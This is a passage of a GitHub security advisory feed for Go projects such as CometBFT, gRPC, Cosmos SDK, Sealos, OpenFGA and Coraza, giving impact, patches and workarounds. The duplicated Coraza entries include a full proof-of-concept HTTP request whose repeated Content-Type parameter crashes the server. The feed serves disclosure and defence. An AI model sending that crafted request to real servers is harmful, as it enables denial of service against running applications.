<p>As the number of nodes in a network increases, and thus, the number of peer struct each node maintains, the possibility of reproducing the perturbation visible with 2 nodes decreases. Only the first <code>PeerState</code> struct will deadlock, and not the others (RPC <code>dump_consensus_state</code> accesses them in a for loop, so the deadlock at the first iteration causes the rest of the iterations of that "for" loop to never be reached).</p>
<p>This regression was introduced in versions <code>v0.34.28</code> and <code>v0.37.1</code>, and will be fixed in <code>v0.34.29</code> and <code>v0.37.2</code>.</p>
<h3 id="patches">Patches</h3>
<p>The PR containing the fix is <a href="https://github.com/cometbft/cometbft/pull/865">here</a>, and the corresponding issue is <a href="https://github.com/cometbft/cometbft/pull/863">here</a></p>
<h3 id="workarounds">Workarounds</h3>
<p>For case 1 (hitting the deadlock via logs)</p>
<ul>
<li>either don't set the log output to "json", leave at "plain",</li>
<li>or don't set the consensus logging module to "debug", leave it at "info" or higher.</li>
</ul>
<p>For case 2 (hitting the deadlock via RPC <code>dump_consensus_state</code>)</p>
<ul>
<li>do not expose <code>dump_consensus_state</code> RPC endpoint to the public internet (e.g., via rules in your nginx setup)</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cometbft/cometbft/pull/863">Issue</a> that introduced the deadlock</li>
<li><a href="https://github.com/cometbft/cometbft/pull/524">Issue</a> reporting the bug via logs</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/cometbft/cometbft/security/advisories/GHSA-mvj3-qrqh-cjvr">https://github.com/cometbft/cometbft/security/advisories/GHSA-mvj3-qrqh-cjvr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-34450">https://nvd.nist.gov/vuln/detail/CVE-2023-34450</a></li>
<li><a href="https://github.com/cometbft/cometbft/pull/524">https://github.com/cometbft/cometbft/pull/524</a></li>
<li><a href="https://github.com/cometbft/cometbft/pull/863">https://github.com/cometbft/cometbft/pull/863</a></li>
<li><a href="https://github.com/cometbft/cometbft/pull/865">https://github.com/cometbft/cometbft/pull/865</a></li>
<li><a href="https://github.com/advisories/GHSA-mvj3-qrqh-cjvr">https://github.com/advisories/GHSA-mvj3-qrqh-cjvr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mvj3-qrqh-cjvr</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2023-07-05T21:33:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[google.golang.org/grpc] Connection confusion in gRPC]]></title>
        <id>https://github.com/advisories/GHSA-cfgp-2977-2fmm</id>
        <link href="https://github.com/advisories/GHSA-cfgp-2977-2fmm"/>
        <updated>2023-07-05T20:26:49.000Z</updated>
        <content type="html"><![CDATA[<p>When gRPC HTTP2 stack raised a header size exceeded error, it skipped parsing the rest of the HPACK frame. This caused any HPACK table mutations to also be skipped, resulting in a desynchronization of HPACK tables between sender and receiver. If leveraged, say, between a proxy and a backend, this could lead to requests from the proxy being interpreted as containing headers from different proxy clients - leading to an information leak that can be used for privilege escalation or data exfiltration. We recommend upgrading beyond the commit contained in&nbsp; <a href="https://github.com/grpc/grpc/pull/32309">https://github.com/grpc/grpc/pull/32309</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-32731">https://nvd.nist.gov/vuln/detail/CVE-2023-32731</a></li>
<li><a href="https://github.com/grpc/grpc/pull/32309">https://github.com/grpc/grpc/pull/32309</a></li>
<li><a href="https://github.com/grpc/grpc/pull/33005">https://github.com/grpc/grpc/pull/33005</a></li>
<li><a href="https://github.com/advisories/GHSA-cfgp-2977-2fmm">https://github.com/advisories/GHSA-cfgp-2977-2fmm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cfgp-2977-2fmm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-07-05T19:12:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cosmos/cosmos-sdk] github.com/cosmos/cosmos-sdk's x/crisis does not charge ConstantFee]]></title>
        <id>https://github.com/advisories/GHSA-w5w5-2882-47pc</id>
        <link href="https://github.com/advisories/GHSA-w5w5-2882-47pc"/>
        <updated>2023-06-30T22:23:26.000Z</updated>
        <content type="html"><![CDATA[<h1 id="xcrisis-does-not-charge-constantfee">x/crisis does not charge ConstantFee</h1>
<h3 id="impact">Impact</h3>
<p>If a transaction is sent to the <code>x/crisis</code> module to check an invariant, the ConstantFee parameter of the chain is NOT charged. All versions of the <code>x/crisis</code> module are affected on all versions of the Cosmos SDK.</p>
<h3 id="details">Details</h3>
<p>The <code>x/crisis</code> module is supposed to allow anyone to halt a chain in the event of a violated invariant by sending a <code>MsgVerifyInvariant</code> with the name of the invariant. Processing this message takes extra processing power hence a <code>ConstantFee</code> was introduced on the chain that is charged as extra from the reporter for the extra computational work. This is supposed to avert spammers on the chain making nodes do extra computations using this transaction. By not charging the <code>ConstantFee</code>, the transactions related to invariant checking are relatively cheaper compared to the computational need and other transactions.</p>
<p>That said, the submitter still has to pay the transaction fee to put the transaction on the network, hence using this weakness for spamming is limited by the usual mechanisms.</p>
<p>Synthetic testing showed up to a 20% increase in CPU usage on a validator node that is spammed by hundreds of <code>MsgVerifyInvariant</code> messages which still makes this an expensive operation to carry out on a live blockchain network.</p>
<h3 id="patches">Patches</h3>
<p>The <code>ConstantFee</code> charge of the <code>x/crisis</code> module will either be fixed or disabled in an upcoming regular release of the Cosmos SDK.</p>
<p>The <code>x/crisis</code> module was originally intended to allow chains to halt rather than continue with some unknown behavior in the case of an invariant violation (safety over liveness). However, as chains mature, and especially as the potential <a href="https://github.com/osmosis-labs/osmosis/issues/570">cost of halting increases</a>, chains should consider carefully what invariants they really want to halt for, and what invariants are just sort of helpful sanity checks.</p>
<p>The SDK team is working on new modules that allow chain developers to fine-tune the chain invariants and the necessary actions.</p>
<p>Hence, the decision was made that the <code>x/crisis</code> module will be deprecated when new modules take over its responsibilities.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no workaround posted. Validators are advised to leave some extra computing room on their servers for possible spamming scenarios. (This is a good measure in any case.)</p>
<h3 id="references">References</h3>
<p>SDK developer epic about invariant checking: <a href="https://github.com/cosmos/cosmos-sdk/issues/15706">https://github.com/cosmos/cosmos-sdk/issues/15706</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-w5w5-2882-47pc">https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-w5w5-2882-47pc</a></li>
<li><a href="https://github.com/cosmos/cosmos-sdk/issues/15706">https://github.com/cosmos/cosmos-sdk/issues/15706</a></li>
<li><a href="https://github.com/advisories/GHSA-w5w5-2882-47pc">https://github.com/advisories/GHSA-w5w5-2882-47pc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w5w5-2882-47pc</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2023-06-30T22:13:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/labring/sealos] Sealos billing system permission control defect]]></title>
        <id>https://github.com/advisories/GHSA-vpxf-q44g-w34w</id>
        <link href="https://github.com/advisories/GHSA-vpxf-q44g-w34w"/>
        <updated>2023-07-03T18:38:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There is a permission flaw in the Sealos billing system, which allows users to control the recharge resource account. sealos. io/v1/Payment, resulting in the ability to recharge any amount of 1 RMB.</p>
<h3 id="details">Details</h3>
<p>The reason is that sealos is in arrears. Egg pain, we can't create a terminal anymore. Let's charge for it:</p>
<p>Then it was discovered that the charging interface had returned all resource information. Unfortunately, based on previous vulnerability experience, the namespace of this custom resource is still under the current user's control and may have permission to correct it.</p>
<h3 id="poc">PoC</h3>
<p>disable by publish</p>
<h3 id="impact">Impact</h3>
<ul>
<li>sealos public cloud user</li>
<li>CWE-287 Improper Authentication</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/labring/sealos/security/advisories/GHSA-vpxf-q44g-w34w">https://github.com/labring/sealos/security/advisories/GHSA-vpxf-q44g-w34w</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36815">https://nvd.nist.gov/vuln/detail/CVE-2023-36815</a></li>
<li><a href="https://github.com/advisories/GHSA-vpxf-q44g-w34w">https://github.com/advisories/GHSA-vpxf-q44g-w34w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vpxf-q44g-w34w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-06-30T20:36:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/labring/sealos] Improper configuration of RBAC permissions obtaining cluster control permissions]]></title>
        <id>https://github.com/advisories/GHSA-74j8-w7f9-pp62</id>
        <link href="https://github.com/advisories/GHSA-74j8-w7f9-pp62"/>
        <updated>2023-06-30T20:25:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Improper configuration of RBAC permissions resulted in obtaining cluster control permissions, which could control the entire cluster deployed with Sealos, as well as hundreds of pods and other resources within the cluster.</p>
<h3 id="details">Details</h3>
<p>detail's is disable by publish.</p>
<h3 id="poc">PoC</h3>
<p>detail's is disable by publish.</p>
<h3 id="impact">Impact</h3>
<ul>
<li>sealos public cloud user</li>
<li>CWE-287 Improper Authentication</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/labring/sealos/security/advisories/GHSA-74j8-w7f9-pp62">https://github.com/labring/sealos/security/advisories/GHSA-74j8-w7f9-pp62</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-33190">https://nvd.nist.gov/vuln/detail/CVE-2023-33190</a></li>
<li><a href="https://github.com/labring/sealos/commit/4cdf52e55666864e5f90ed502e9fc13e18985b7b">https://github.com/labring/sealos/commit/4cdf52e55666864e5f90ed502e9fc13e18985b7b</a></li>
<li><a href="https://github.com/advisories/GHSA-74j8-w7f9-pp62">https://github.com/advisories/GHSA-74j8-w7f9-pp62</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-74j8-w7f9-pp62</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2023-06-30T20:25:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[go.temporal.io/server] Temporal Server vulnerable to Incorrect Authorization and Insecure Default Initialization of Resource]]></title>
        <id>https://github.com/advisories/GHSA-gm2g-2xr9-pxxj</id>
        <link href="https://github.com/advisories/GHSA-gm2g-2xr9-pxxj"/>
        <updated>2023-06-30T20:25:38.000Z</updated>
        <content type="html"><![CDATA[<p>Insecure defaults in open-source Temporal Server before version 1.20 on all platforms allows an attacker to craft a task token with access to a namespace other than the one specified in the request. Creation of this task token must be done outside of the normal Temporal server flow. It requires the namespace UUID and information from the workflow history for the target namespace. Under these conditions, it is possible to interfere with pending tasks in other namespaces, such as marking a task failed or completed.
If a task is targeted for completion by the attacker, the targeted namespace must also be using the same data converter configuration as the initial, valid, namespace for the task completion payload to be decoded by workers in the target namespace.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-3485">https://nvd.nist.gov/vuln/detail/CVE-2023-3485</a></li>
<li><a href="https://github.com/temporalio/temporal/releases/tag/v1.20.0">https://github.com/temporalio/temporal/releases/tag/v1.20.0</a></li>
<li><a href="https://github.com/advisories/GHSA-gm2g-2xr9-pxxj">https://github.com/advisories/GHSA-gm2g-2xr9-pxxj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gm2g-2xr9-pxxj</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2023-06-30T18:31:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/openfga/openfga] OpenFGA vulnerable to denial of service due to circular relationship]]></title>
        <id>https://github.com/advisories/GHSA-hr9r-8phq-5x8j</id>
        <link href="https://github.com/advisories/GHSA-hr9r-8phq-5x8j"/>
        <updated>2023-07-03T18:39:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="overview">Overview</h3>
<p>OpenFGA versions v1.1.0 and prior are vulnerable to a DoS attack when certain Check and ListObjects calls are executed against authorization models that contain circular relationship definitions.</p>
<h3 id="am-i-affected">Am I Affected?</h3>
<p>You are affected by this vulnerability if you are using OpenFGA v1.1.0 or earlier, and if you are executing certain <a href="https://openfga.dev/api/service#/Relationship%20Queries/Check">Check</a> or <a href="https://openfga.dev/api/service#/Relationship%20Queries/ListObjects">ListObjects</a> calls against a vulnerable authorization model. To see which of your models could be vulnerable to this attack, download OpenFGA v1.2.0 and run the following command: </p>
<pre><code>./openfga validate-models --datastore-engine &lt;ENGINE&gt; --datastore-uri &lt;URI&gt; | jq .[] | select(.Error | contains("loop"))
</code></pre>
<p>replacing the variables <code>&lt;ENGINE&gt;</code> and <code>&lt;URI&gt;</code> as needed.</p>
<h3 id="fix">Fix</h3>
<p>Upgrade to v1.1.1.</p>
<h3 id="backward-compatibility">Backward Compatibility</h3>
<p>If you are not passing an invalid authorization model (as identified by running <code>./openfga validate-models</code>) as a parameter of your Check and ListObjects calls, this upgrade is backwards compatible. </p>
<p>Otherwise, OpenFGA v1.1.1 will start returning HTTP 400 status codes on those calls.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openfga/openfga/security/advisories/GHSA-hr9r-8phq-5x8j">https://github.com/openfga/openfga/security/advisories/GHSA-hr9r-8phq-5x8j</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-35933">https://nvd.nist.gov/vuln/detail/CVE-2023-35933</a></li>
<li><a href="https://github.com/openfga/openfga/commit/087ce392595f3c319ab3028b5089118ea4063452">https://github.com/openfga/openfga/commit/087ce392595f3c319ab3028b5089118ea4063452</a></li>
<li><a href="https://openfga.dev/api/service#/Relationship%20Queries/Check">https://openfga.dev/api/service#/Relationship%20Queries/Check</a></li>
<li><a href="https://openfga.dev/api/service#/Relationship%20Queries/ListObjects">https://openfga.dev/api/service#/Relationship%20Queries/ListObjects</a></li>
<li><a href="https://github.com/advisories/GHSA-hr9r-8phq-5x8j">https://github.com/advisories/GHSA-hr9r-8phq-5x8j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hr9r-8phq-5x8j</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-06-28T22:49:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/authzed/spicedb] SpiceDB's LookupResources may return partial results]]></title>
        <id>https://github.com/advisories/GHSA-m54h-5x5f-5m6r</id>
        <link href="https://github.com/advisories/GHSA-m54h-5x5f-5m6r"/>
        <updated>2023-06-30T20:25:43.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Any user making a negative authorization decision based on the results of a LookupResources request with 1.22.0 is affected.</p>
<p>For example, using <code>LookupResources</code> to find a list of resources to allow access to be okay: some subjects that should have access to a resource may not. But if using <code>LookupResources</code> to find a list of banned resources instead, then some users that shouldn't have access may.</p>
<p>Generally, <code>LookupResources</code> is not and should not be used to gate access in this way - that's what the <code>Check</code> API is for. Additionally, version 1.22.0 has included a warning about this bug since its initial release.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Avoid using <code>LookupResources</code> for negative authorization decisions if using <code>1.22.0</code>. </p>
<h3 id="patches">Patches</h3>
<p>The only affected release is <a href="https://github.com/authzed/spicedb/releases/tag/v1.22.0">v1.22.0</a>, and it is patched in <a href="https://github.com/authzed/spicedb/releases/tag/v1.22.2">v1.22.2</a> (there is no v1.22.1 release, though there is a git tag).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/authzed/spicedb/pull/1397">https://github.com/authzed/spicedb/pull/1397</a></li>
</ul>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in <a href="https://github.com/authzed/spicedb">SpiceDB</a></li>
<li>Ask a question in the <a href="https://authzed.com/discord">SpiceDB Discord</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/authzed/spicedb/security/advisories/GHSA-m54h-5x5f-5m6r">https://github.com/authzed/spicedb/security/advisories/GHSA-m54h-5x5f-5m6r</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-35930">https://nvd.nist.gov/vuln/detail/CVE-2023-35930</a></li>
<li><a href="https://github.com/authzed/spicedb/pull/1397">https://github.com/authzed/spicedb/pull/1397</a></li>
<li><a href="https://github.com/authzed/spicedb/releases/tag/v1.22.2">https://github.com/authzed/spicedb/releases/tag/v1.22.2</a></li>
<li><a href="https://github.com/advisories/GHSA-m54h-5x5f-5m6r">https://github.com/advisories/GHSA-m54h-5x5f-5m6r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m54h-5x5f-5m6r</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2023-06-28T22:48:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/corazawaf/coraza/v2] Coraza has potential denial of service vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-c2pj-v37r-2p6h</id>
        <link href="https://github.com/advisories/GHSA-c2pj-v37r-2p6h"/>
        <updated>2023-07-05T19:51:37.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Due to the misuse of <code>log.Fatalf</code>, the application using coraza crashed after receiving crafted requests from attackers.</p>
<h3 id="details">Details</h3>
<p><a href="https://github.com/corazawaf/coraza/blob/82157f85f24c6107667bf0f686b71a72aafdf8a5/internal/bodyprocessors/multipart.go#L26-L29">https://github.com/corazawaf/coraza/blob/82157f85f24c6107667bf0f686b71a72aafdf8a5/internal/bodyprocessors/multipart.go#L26-L29</a>
The bodyprocessors of multipart uses <code>log.Fatalf</code> to handle errors from the <code>mime.ParseMediaType</code>, but <code>log.Fatalf</code> calls <code>os.Exit</code> directly after logging the error.
<a href="https://github.com/golang/go/blob/a031f4ef83edc132d5f49382bfef491161de2476/src/log/log.go#L288-L291">https://github.com/golang/go/blob/a031f4ef83edc132d5f49382bfef491161de2476/src/log/log.go#L288-L291</a>
This means that the application will immediately crash after receiving a malicious request that triggers an error in <code>mime.ParseMediaType</code>.</p>
<h3 id="poc">PoC</h3>
<p>The server can be demonstrated by <a href="https://github.com/corazawaf/coraza/tree/main/examples/http-server">https://github.com/corazawaf/coraza/tree/main/examples/http-server</a></p>
<p>After sending this request</p>
<pre><code>POST / HTTP/1.1
Host: 127.0.0.1:8090
User-Agent: curl/8.1.2
Accept: */*
Content-Length: 199
Content-Type: multipart/form-data; boundary=------------------------5fa6351b877326a1; a=1; a=2
Connection: close

--------------------------5fa6351b877326a1
Content-Disposition: form-data; name="file"; filename="123"
Content-Type: application/octet-stream

123

--------------------------5fa6351b877326a1--
</code></pre>
<p>The server will crash immediately. The <code>a=1; a=2</code> in <code>Content-Type</code> makes <code>mime: duplicate parameter name</code> error.</p>
<h3 id="impact">Impact</h3>
<p>I believe the vulnerability was introduced by the following commit: <a href="https://github.com/corazawaf/coraza/commit/24af0c8cf4f10bab558740b595712be3b85493ec">https://github.com/corazawaf/coraza/commit/24af0c8cf4f10bab558740b595712be3b85493ec</a>.</p>
<h3 id="mitigation">Mitigation</h3>
<p>The error from <code>mime.ParseMediaType</code> should return directly.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/corazawaf/coraza/security/advisories/GHSA-c2pj-v37r-2p6h">https://github.com/corazawaf/coraza/security/advisories/GHSA-c2pj-v37r-2p6h</a></li>
<li><a href="https://github.com/corazawaf/coraza-caddy/issues/48">https://github.com/corazawaf/coraza-caddy/issues/48</a></li>
<li><a href="https://github.com/corazawaf/coraza/commit/24af0c8cf4f10bab558740b595712be3b85493ec">https://github.com/corazawaf/coraza/commit/24af0c8cf4f10bab558740b595712be3b85493ec</a></li>
<li><a href="https://github.com/corazawaf/coraza/commit/e1b119b83e12c64f0957e00e8cad45a1b5f012f8">https://github.com/corazawaf/coraza/commit/e1b119b83e12c64f0957e00e8cad45a1b5f012f8</a></li>
<li><a href="https://github.com/corazawaf/coraza/blob/82157f85f24c6107667bf0f686b71a72aafdf8a5/internal/bodyprocessors/multipart.go#L26-L29">https://github.com/corazawaf/coraza/blob/82157f85f24c6107667bf0f686b71a72aafdf8a5/internal/bodyprocessors/multipart.go#L26-L29</a></li>
<li><a href="https://github.com/corazawaf/coraza/releases/tag/v3.0.1">https://github.com/corazawaf/coraza/releases/tag/v3.0.1</a></li>
<li><a href="https://github.com/golang/go/blob/a031f4ef83edc132d5f49382bfef491161de2476/src/log/log.go#L288-L291">https://github.com/golang/go/blob/a031f4ef83edc132d5f49382bfef491161de2476/src/log/log.go#L288-L291</a></li>
<li><a href="https://github.com/corazawaf/coraza/commit/a5239ba3ce839e14d9b4f9486e1b4a403dcade8c">https://github.com/corazawaf/coraza/commit/a5239ba3ce839e14d9b4f9486e1b4a403dcade8c</a></li>
<li><a href="https://github.com/advisories/GHSA-c2pj-v37r-2p6h">https://github.com/advisories/GHSA-c2pj-v37r-2p6h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c2pj-v37r-2p6h</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-06-26T15:48:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/corazawaf/coraza/v3] Coraza has potential denial of service vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-c2pj-v37r-2p6h</id>
        <link href="https://github.com/advisories/GHSA-c2pj-v37r-2p6h"/>
        <updated>2023-07-05T19:51:37.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Due to the misuse of <code>log.Fatalf</code>, the application using coraza crashed after receiving crafted requests from attackers.</p>
<h3 id="details">Details</h3>
<p><a href="https://github.com/corazawaf/coraza/blob/82157f85f24c6107667bf0f686b71a72aafdf8a5/internal/bodyprocessors/multipart.go#L26-L29">https://github.com/corazawaf/coraza/blob/82157f85f24c6107667bf0f686b71a72aafdf8a5/internal/bodyprocessors/multipart.go#L26-L29</a>
The bodyprocessors of multipart uses <code>log.Fatalf</code> to handle errors from the <code>mime.ParseMediaType</code>, but <code>log.Fatalf</code> calls <code>os.Exit</code> directly after logging the error.
<a href="https://github.com/golang/go/blob/a031f4ef83edc132d5f49382bfef491161de2476/src/log/log.go#L288-L291">https://github.com/golang/go/blob/a031f4ef83edc132d5f49382bfef491161de2476/src/log/log.go#L288-L291</a>
This means that the application will immediately crash after receiving a malicious request that triggers an error in <code>mime.ParseMediaType</code>.</p>
<h3 id="poc">PoC</h3>
<p>The server can be demonstrated by <a href="https://github.com/corazawaf/coraza/tree/main/examples/http-server">https://github.com/corazawaf/coraza/tree/main/examples/http-server</a></p>
<p>After sending this request</p>
<pre><code>POST / HTTP/1.1
Host: 127.0.0.1:8090
User-Agent: curl/8.1.2
Accept: */*
Content-Length: 199
Content-Type: multipart/form-data; boundary=------------------------5fa6351b877326a1; a=1; a=2
Connection: close

--------------------------5fa6351b877326a1
Content-Disposition: form-data; name="file"; filename="123"
Content-Type: application/octet-stream

123

--------------------------5fa6351b877326a1--
</code></pre>
<p>The server will crash immediately. The <code>a=1; a=2</code> in <code>Content-Type</code> makes <code>mime: duplicate parameter name</code> error.</p>
<h3 id="impact">Impact</h3>
<p>I believe the vulnerability was introduced by the following commit: <a href="https://github.com/corazawaf/coraza/commit/24af0c8cf4f10bab558740b595712be3b85493ec">https://github.com/corazawaf/coraza/commit/24af0c8cf4f10bab558740b595712be3b85493ec</a>.</p>
<h3 id="mitigation">Mitigation</h3>
<p>The error from <code>mime.ParseMediaType</code> should return directly.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/corazawaf/coraza/security/advisories/GHSA-c2pj-v37r-2p6h">https://github.com/corazawaf/coraza/security/advisories/GHSA-c2pj-v37r-2p6h</a></li>
<li><a href="https://github.com/corazawaf/coraza-caddy/issues/48">https://github.com/corazawaf/coraza-caddy/issues/48</a></li>
<li><a href="https://github.com/corazawaf/coraza/commit/24af0c8cf4f10bab558740b595712be3b85493ec">https://github.com/corazawaf/coraza/commit/24af0c8cf4f10bab558740b595712be3b85493ec</a></li>
<li><a href="https://github.com/corazawaf/coraza/commit/e1b119b83e12c64f0957e00e8cad45a1b5f012f8">https://github.com/corazawaf/coraza/commit/e1b119b83e12c64f0957e00e8cad45a1b5f012f8</a></li>
<li><a href="https://github.com/corazawaf/coraza/blob/82157f85f24c6107667bf0f686b71a72aafdf8a5/internal/bodyprocessors/multipart.go#L26-L29">https://github.com/corazawaf/coraza/blob/82157f85f24c6107667bf0f686b71a72aafdf8a5/internal/bodyprocessors/multipart.go#L26-L29</a></li>
<li><a href="https://github.com/corazawaf/coraza/releases/tag/v3.0.1">https://github.com/corazawaf/coraza/releases/tag/v3.0.1</a></li>
<li><a href="https://github.com/golang/go/blob/a031f4ef83edc132d5f49382bfef491161de2476/src/log/log.go#L288-L291">https://github.com/golang/go/blob/a031f4ef83edc132d5f49382bfef491161de2476/src/log/log.go#L288-L291</a></li>
<li><a href="https://github.com/corazawaf/coraza/commit/a5239ba3ce839e14d9b4f9486e1b4a403dcade8c">https://github.com/corazawaf/coraza/commit/a5239ba3ce839e14d9b4f9486e1b4a403dcade8c</a></li>
<li><a href="https://github.com/advisories/GHSA-c2pj-v37r-2p6h">https://github.com/advisories/GHSA-c2pj-v37r-2p6h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c2pj-v37r-2p6h</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-06-26T15:48:33.000Z</published>
    </entry>
</feed>